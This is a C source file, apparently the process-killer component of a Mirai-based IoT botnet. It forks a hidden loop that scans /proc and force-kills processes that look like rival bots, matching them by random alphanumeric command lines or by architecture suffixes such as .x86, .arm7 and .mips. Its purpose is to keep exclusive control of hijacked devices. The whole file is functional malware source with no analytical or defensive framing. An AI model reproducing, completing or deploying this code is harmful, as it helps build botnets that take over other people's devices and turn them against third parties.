#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;

BOOL killer_mirai_exists(char *pid) {

    char rdpath[PATH_MAX] = {0};
    char rdbuf[128] = {0};

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_CMDLINE);

    util_strcpy(rdpath, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    util_strcat(rdpath, pid);
    util_strcat(rdpath, table_retrieve_val(TABLE_KILLER_CMDLINE, NULL));

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_CMDLINE);

    int fd = open(rdpath, O_RDONLY);

    if (fd <= 0) {
        return FALSE;
    }

    read(fd, rdbuf, sizeof(rdbuf));
    close(fd);

    int len = util_strlen(rdbuf);

    if (len == 0)
        return FALSE;

    int digits = 0, alpha_nums = 0;

    for (int i = 0; i < len; i++) {

        if (util_isdigit(rdbuf[i]))
            digits++;

        else if (util_isalpha(rdbuf[i]))
            alpha_nums++;
        else
            return FALSE;
    }

    return (alpha_nums >= 5 & digits >= 2);
}

void killer_kill(void) {
    if (killer_pid != 0)
        kill(killer_pid, 9);
}

// killer made by zxcr9999 do not copy and paste
void killer_exe(void) {
    const char *extensions[] = {".x86", ".x86_64", ".arm", ".arm5", ".arm6", ".arm7", ".mips", ".mipsel", ".sh4", ".ppc"};
    const int num_extensions = sizeof(extensions) / sizeof(extensions[0]);

    while (1) {
        DIR *dir = opendir("/proc");
        struct dirent *entry;

        if (dir == NULL) {
            perror("Error opening /proc directory");
            return;
        }

        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                int pid = atoi(entry->d_name);
                if (pid != 0) {
                    char exe_path[1024];
                    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);

                    char target_path[1024];
                    ssize_t target_len = readlink(exe_path, target_path, sizeof(target_path) - 1);
                    if (target_len != -1) {
                        target_path[target_len] = '\0';

                        const char *extension = strrchr(target_path, '.');
                        if (extension != NULL) {
                            for (int i = 0; i < num_extensions; i++) {
                                if (strcmp(extension, extensions[i]) == 0) {
                                    kill(pid, SIGKILL);
                                    #ifdef DEBUG
                                    printf("Killed process with PID %d, Path %s\n", pid, target_path);
                                    #endif
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }

        closedir(dir);
        sleep(5);
    }
}

void killer_init(void) {

    struct dirent *file = NULL;

    killer_pid = fork();

    if (killer_pid != 0)
        return;

#ifdef DEBUG
    printf("[killer] starting memory scan on (pid=%d)\n", getpid());
#endif

    while (TRUE) {

        table_unlock_val(TABLE_KILLER_PROC);

        DIR *dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));

        table_lock_val(TABLE_KILLER_PROC);

        if (!dir) {
    #ifdef DEBUG
            printf("[killer] failed to open /proc");
    #endif

            exit(1);
        }

        while ((file = readdir(dir))) {

            if (*file->d_name < '0' || *file->d_name > '9')
                continue;

            int pid = util_atoi(file->d_name, 10);

            if (pid == getppid() || pid == getpid())
                continue;

            if (killer_mirai_exists(file->d_name)) {
    #ifdef DEBUG
                printf("[killer] killing process %s\n", file->d_name);
    #endif
                kill(pid, 9);
            }
        }

        closedir(dir);

        // call function
        killer_exe();

        // rescan just 3 seconds
        sleep(3);
    }
}
